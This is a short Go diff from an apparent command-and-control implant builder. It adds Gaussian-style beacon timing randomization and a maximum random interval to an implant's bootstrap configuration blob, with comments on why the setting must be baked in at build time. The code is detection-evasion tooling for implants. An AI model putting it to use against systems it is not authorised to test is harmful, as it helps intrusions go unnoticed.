@@ -169,6 +169,18 @@ func marshalConfigBlobJSON(cfg ImplantConfig, profile MalleableProfile) []byte {
 			MalleableRequestPrepend: cfg.MalleableRequestPrepend,
 			MalleableRequestAppend:  cfg.MalleableRequestAppend,
 			MalleableRequestHeaders: cfg.MalleableRequestHeaders,
+			// Beacon timing randomization must be baked even for bootstrap
+			// builds: unlike interval/jitter it has NO over-the-wire slot.
+			// NetworkConfig carries interval/jitter (so they are not burned in),
+			// but adding the randomization mode there would overwrite the
+			// per-implant choice with the fleet default on every refresh. The
+			// operator already resolved it at build time (form > fleet default),
+			// so the only place it survives for a config-over-wire implant is the
+			// bootstrap blob. Without this, "Gaussian + network config over wire"
+			// silently shipped linear -- the feature did nothing for that build
+			// flavor.
+			BeaconRandomization: cfg.BeaconRandomization,
+			MaxRandomIntervalMs: fmt.Sprintf("%d", cfg.MaxRandomIntervalMs),
 			// Client credentials are needed to reach the initial endpoint when
 			// it requires a client certificate, so the bootstrap build keeps
 			// them even though everything else moves over the wire later.
